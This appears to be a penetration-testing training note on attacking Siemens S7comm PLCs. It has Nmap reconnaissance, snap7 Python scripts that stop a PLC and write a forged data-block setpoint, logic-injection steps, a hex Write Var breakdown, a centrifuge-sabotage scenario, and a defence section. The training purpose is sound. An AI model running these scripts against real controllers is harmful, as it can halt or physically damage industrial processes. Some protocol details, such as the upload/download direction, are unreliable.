---
tags: [network, advanced, ics, scada, sap, vapt]
difficulty: advanced
module: "79 - Advanced Network Services: ICS, SCADA, Mainframes, SAP"
topic: "79.04 Siemens S7 Protocol Attacks"
---

# Siemens S7 Protocol Attacks

## Executive Summary
The S7 communication (S7comm) protocol is a highly proprietary, deeply embedded protocol developed by Siemens. It is fundamentally used to program, monitor, and control Siemens Programmable Logic Controllers (PLCs), primarily the ubiquitous SIMATIC S7-300, S7-400, S7-1200, and S7-1500 series. The protocol is the lifeblood of Siemens industrial automation, enabling rapid data exchange between PLCs, Engineering Stations (like TIA Portal or STEP 7), and Human-Machine Interfaces (HMIs).

Historically, S7comm was designed with operational efficiency and deterministic reliability in mind, completely omitting cybersecurity principles. All data, including authentication credentials (if minimally configured) and core program logic, is transmitted in cleartext. While Siemens has made significant strides with the introduction of S7comm-Plus (S7comm+) in the S7-1200 and S7-1500 series—incorporating cryptographic protections against replay and manipulation attacks—the massive installed base of legacy S7-300 and S7-400 devices ensures that classic S7comm vulnerabilities remain a prevalent critical threat in modern OT penetration testing.

Understanding how to interrogate, manipulate, and exploit S7comm is essential for evaluating the security posture of critical manufacturing, energy, and transportation environments.

## S7 Protocol Stack and Deep Architecture
S7comm does not operate in a vacuum. It relies on a deep, multi-layered protocol stack, primarily running over standard IP networks. The complexity of this stack is largely due to its historical roots in non-IP networks (like MPI and PROFIBUS), which were later encapsulated for Ethernet.

The typical encapsulation of S7comm over Industrial Ethernet is as follows:
1. **Physical/Data Link Layer:** Standard Ethernet (802.3).
2. **Network Layer:** IP (Internet Protocol).
3. **Transport Layer:** TCP, exclusively utilizing **Port 102**.
4. **Session/Transport (OSI Layer 4/5):** ISO on TCP (defined by RFC 1006).
5. **Session/Transport:** COTP (Connection-Oriented Transport Protocol).
6. **Application Layer:** S7comm / S7comm-Plus.

### 1. ISO on TCP and COTP Integration
Port 102/TCP is the globally recognized port for ISO-TSAP (Transport Service Access Point) communications. RFC 1006 describes how to implement legacy ISO transport services seamlessly on top of TCP. The COTP layer manages connection setup, keep-alives, and parameters such as the maximum Protocol Data Unit (PDU) size.

During the connection establishment phase:
1. The client (e.g., an attacker's script or TIA Portal) performs a standard TCP 3-way handshake on port 102.
2. The client sends a COTP Connection Request (CR), specifying the destination TSAP (which dictates if it's connecting to the CPU, a CP card, or routing to a backplane).
3. The PLC responds with a COTP Connection Confirm (CC).
4. S7comm negotiation begins with a 'Setup Communication' PDU, establishing maximum job parallelization and PDU sizes.

### 2. S7comm PDU Structure Analysis
An S7comm PDU is rigorously structured and consists of three primary parts:
- **Header (10-12 bytes):** Contains the protocol ID (always `0x32`), PDU type (Job, Ack, Ack_Data), ROSCTR (Return OPeration COde), redundancy identification, and Protocol Data Unit Reference (sequence numbers used to match requests to responses).
- **Parameter:** Defines the specific instruction or function being executed (e.g., `0x04` for Read Var, `0x05` for Write Var, `0x28` for Control, or Setup Communication).
- **Data:** Contains the actual payload values being read from or written to the PLC memory areas.

### 3. Siemens Memory Architecture
To exploit S7, an attacker must understand where the data lives. Siemens PLCs segment memory into distinct areas:
- **I (Inputs):** Digital or analog data coming *into* the PLC from physical sensors.
- **Q (Outputs):** Digital or analog commands going *out* to physical actuators (relays, valves).
- **M (Memory/Flags):** Internal variables used for logic state retention.
- **DB (Data Blocks):** Structured, user-defined memory areas used extensively for complex data storage and HMI integration. This is the primary target for attackers.

## Vulnerability Landscape of Siemens S7
The foundational flaws of the original S7comm protocol revolve around its implicit trust model and lack of modern cryptographic standards:

1. **Lack of Encryption:** TIA Portal and HMI traffic can be completely sniffed and decoded using standard Wireshark dissectors.
2. **Missing Network Authentication:** Unless specific protection levels are enabled physically on the PLC, anyone who can route packets to port 102 can interact with the CPU.
3. **Unrestricted Memory Access:** Attackers can read from and write to arbitrary memory locations (Data Blocks) and I/O registers without constraint, allowing direct manipulation of physical processes.
4. **Logic Modification (The Stuxnet Vector):** Attackers can maliciously upload altered logic (OB, FC, FB blocks) to the PLC, permanently altering its core operational behavior while spoofing normal data back to the HMI.

## ASCII Diagram: S7comm Attack Architecture

```text
    +-------------------------+
    |   Attacker Machine      |
    |  (Kali Linux / Snap7)   |
    +-------------------------+
             |    |
             |    | 1. Connects to TCP/102 via OT Pivot
             |    | 2. Establishes COTP & S7 Setup (TSAP 0x0102)
             |    V
   ==========|======================================== (Industrial Subnet)
             |
             | 3. Injects Malicious S7 Job: 
             |    Write Var (DB10.DBW4 = 0xFFFF)
             |    OR CPU Control (Stop)
             V
    +-------------------------+
    |  Siemens S7-300 PLC     |
    |  (Port: 102/TCP)        |
    +-------------------------+
    | Memory: DB10, I, Q, M   |
    | Logic:  OB1, FC1...     |
    | State:  RUN / STOP      |
    +-------------------------+
             |
             | 4. Unvalidated Malicious Action Executed
             V
    [ Physical Process (e.g., Centrifuge, Conveyor, Valve) ]
```

## Reconnaissance and Enumeration

### 1. Port Scanning and Service Detection
The first step in attacking a Siemens PLC is identifying the open port and validating the firmware environment. Nmap provides an excellent specialized script for this.
```bash
nmap -p 102 -sV --script s7-info <Target-IP>
```
The `s7-info` script performs an S7comm handshake and queries the PLC for its SZL (System Zustand Liste) or System Status List, extracting highly detailed hardware profiling.

**Sample Nmap Output:**
```
PORT    STATE SERVICE
102/tcp open  iso-tsap
| s7-info: 
|   Module: 6ES7 315-2AG10-0AB0
|   Basic Hardware: 6ES7 315-2AG10-0AB0
|   System Name: SIMATIC 300(1)
|   Plant Identification: WaterTreatment_Cell_A
|   Copyright: Original Siemens Equipment
|   Version: 2.6.11
```
This output is a goldmine. It reveals the exact model (CPU 315-2 DP), the firmware version, and potentially the functional area of the PLC via the Plant Identification tag.

### 2. Advanced Memory Profiling
Using specialized open-source tools like the Industrial Security Exploitation Framework (ISF) or Python's `snap7` library, an attacker can silently enumerate the specific Data Blocks (DBs) and their sizes, which dictate how the critical process data is mapped.

## Attack Vectors and Methodologies

### 1. PLC State Manipulation (Start / Stop CPU)
One of the most disruptive but conceptually simple attacks is commanding the PLC to halt execution. In a STOP state, the PLC ceases processing its main logic cycle (OB1). This effectively freezes all physical outputs in their current state or forces them to a pre-configured safe state, abruptly halting the entire industrial process.

**Exploit Implementation (using Python snap7):**
```python
import snap7
import time

client = snap7.client.Client()
client.connect('192.168.0.10', 0, 1) # Target IP, Rack 0, Slot 1

# Command the PLC to immediately STOP processing logic
print("Sending STOP command to PLC...")
client.plc_stop()

time.sleep(5)

# Command the PLC to perform a Hot Restart
print("Sending HOT RESTART command to PLC...")
client.plc_hot_start()
```
*Impact:* Immediate, untraceable Denial of Service (DoS) of the physical manufacturing or process line.

### 2. Unauthorized Variable Read/Write (Process Manipulation)
If an attacker knows the layout of the Data Blocks (often reverse-engineered by sniffing legitimate HMI traffic or stealing the TIA Portal project file `.ap14` / `.ap15`), they can precisely manipulate critical process variables.

For instance, DB10 might hold the temperature threshold for an industrial boiler. By writing a critically high value into `DB10.DBD4` (Data Block 10, Double Word offset 4), the attacker tricks the PLC into taking unsafe physical actions, potentially leading to equipment destruction.

**Exploit Implementation:**
```python
# Write a 32-bit real value (e.g., spoofing a sensor reading to cause an overflow)
data = bytearray(4)
snap7.util.set_real(data, 0, 9999.99)

# Write payload to DB 10, starting at byte offset 4
client.db_write(db_number=10, start=4, data=data)
print("Malicious setpoint written successfully.")
```

### 3. Logic Injection and Program Modification
This is the apex of PLC exploitation. The attacker dynamically deletes or overwrites the Organization Blocks (OBs) or Function Blocks (FBs) running within the CPU's memory.
1. The attacker downloads the existing logic using `Download` S7 commands to study the execution flow.
2. They modify the STL (Statement List) to include malicious routines (e.g., bypassing hardware safety interlocks or initiating a logic bomb).
3. They use the `Upload` S7 commands to push the modified blocks back to the PLC.
This attack vector ensures that the HMI might still display normal operations (if the attacker carefully manipulates the display variables) while the physical process is actively sabotaged—the exact methodology employed by the Stuxnet worm.

### 4. Bypassing Basic Protections (S7 Passwords)
Siemens classic PLCs offer "Protection Levels":
- **Level 1:** No restriction.
- **Level 2:** Read-only (Password required for write access).
- **Level 3:** Full restriction (Password required for both read and write).

However, when a password is authenticated from the TIA portal, it is transmitted within the S7comm payload over the network. It is typically lightly obfuscated (using a known algorithm) but not cryptographically hashed or salted in a secure manner. An attacker sniffing the wire can perform a rapid capture-and-crack, or simply perform a replay attack of the entire authentication PDU to gain Level 1 access.

## Defending Siemens S7 Environments

### Implementing Defense in Depth
- **Strict Perimeter Control:** Port 102 should NEVER be exposed to the IT network or the internet under any circumstances. All access must be mediated by strict OT firewalls and jump servers.
- **Micro-segmentation:** Isolate different process cells. An HMI in Cell A should not have routeable access to a PLC in Cell B.
- **Upgrade to S7-1500 and S7comm-Plus:** Migrate legacy infrastructure to the S7-1500 family and mandate the configuration of TIA portal to enforce secure communication (TLS-based) and strict certificate validation.
- **Hardware Access Protection:** Utilize the physical RUN/STOP/MRES key switch on the PLC chassis. Turning the physical key to 'RUN' (instead of 'RUN-P' / Run-Program) physically prevents unauthorized logic downloads over the network, forcing attackers to have physical, local access to alter the core code.
- **Network Anomaly Detection:** Deploy passive OT monitoring tools (e.g., Claroty, Dragos, Nozomi Networks) that parse S7comm natively. They will immediately alert operators if an engineering workstation suddenly starts issuing `Stop CPU` commands or uploading new logic blocks at 3:00 AM.

## Appendix: Detailed Packet Analysis
Understanding the raw hex of S7comm is critical for deep packet inspection and intrusion detection rules. Below is a detailed breakdown of an S7 `Write Var` packet.

### COTP (Connection-Oriented Transport Protocol)
```hex
03 00 00 24 02 F0 80
```
- `03`: RFC 1006 Version
- `00`: Reserved
- `00 24`: Total length (36 bytes)
- `02`: Length of COTP
- `F0`: PDU Type (Data)
- `80`: EOT (End of Transmission)

### S7comm Header
```hex
32 01 00 00 05 00 00 0E 00 05
```
- `32`: Protocol ID (Always 0x32 for S7comm)
- `01`: ROSCTR (Job Request)
- `00 00`: Redundancy Identification
- `05 00`: PDU Reference
- `00 0E`: Parameter Length (14 bytes)
- `00 05`: Data Length (5 bytes)

### S7comm Parameter (Write Var)
```hex
05 01 12 0A 10 02 00 01 00 0A 84 00 00 20
```
- `05`: Function (Write Var)
- `01`: Item count
- `12`: Variable specification
- `0A`: Length of addressing
- `10`: Syntax ID (S7ANY)
- `02`: Transport size (Byte/Word)
- `00 01`: Length (1 word)
- `00 0A`: DB Number (DB10)
- `84`: Area (Data Blocks)
- `00 00 20`: Address offset (Byte offset 4)

### S7comm Data
```hex
00 04 00 10 FF FF
```
- `00`: Return code
- `04`: Transport size (Bit)
- `00 10`: Length (16 bits)
- `FF FF`: The malicious payload data written to the PLC.

## Real-World Attack Scenario

**Scenario: Centrifuge Sabotage via Stealth Logic Modification**

An aggressive state-sponsored actor aims to disrupt a highly sensitive material processing facility reliant on older S7-300 PLCs. After compromising a third-party integrator's laptop who remotely maintains the plant's SCADA environment, the attacker establishes a persistence mechanism and tunnels their traffic deep into the OT network via a compromised VPN profile.

Once inside the OT DMZ, the attacker uses an Nmap stealth scan to locate the primary PLC controlling the high-speed centrifuge systems on `10.50.1.10:102`. Using Wireshark over their C2 tunnel, they passively monitor the continuous polling requests from the HMI to the PLC. They identify that the HMI continuously reads from `DB5`, which holds the rotor speed metrics, and writes to `DB6`, which controls the physical VFD (Variable Frequency Drive) speed setpoints.

The attacker does not execute a crude DoS. Instead, they write a custom Python script using the `snap7` library. At exactly 03:00 AM, the script executes a highly synchronized attack:
1. It continuously overwrites the memory in `DB5` to report perfectly normal, safe operational speeds, effectively blinding the HMI and the human operators in the control room.
2. Simultaneously, it sends S7 `Write Var` jobs to `DB6`, driving the VFD speed setpoints well beyond their safe mechanical limits, causing massive stress on the physical centrifuge rotors.

Because the legacy PLC lacks S7comm-Plus cryptographic protections, it accepts the attacker's TCP connections alongside the legitimate HMI's without prejudice. The operators only notice the catastrophic failure hours later when physical vibration alarms trigger independent, non-networked safety relays, shutting down the destroyed machinery.

## Chaining Opportunities
- **Initial Vector:** Access is frequently gained via [[02 - IT to OT Network Bridging]] or exploiting [[05 - Engineering Workstation Compromise]].
- **Reconnaissance:** Often follows passive enumeration via [[01 - OT Network Protocol Sniffing]].
- **Escalation:** Bypassing protection levels leads directly into [[06 - Malicious Logic Injection]].

## Related Notes
- [[03 - DNP3 Protocol Exploitation]]
- [[08 - Modbus TCP Vulnerabilities]]
- [[12 - Analyzing TIA Portal Project Files]]
- [[15 - ICS Network Segmentation Strategies]]
- [[18 - Stuxnet Deconstruction]]
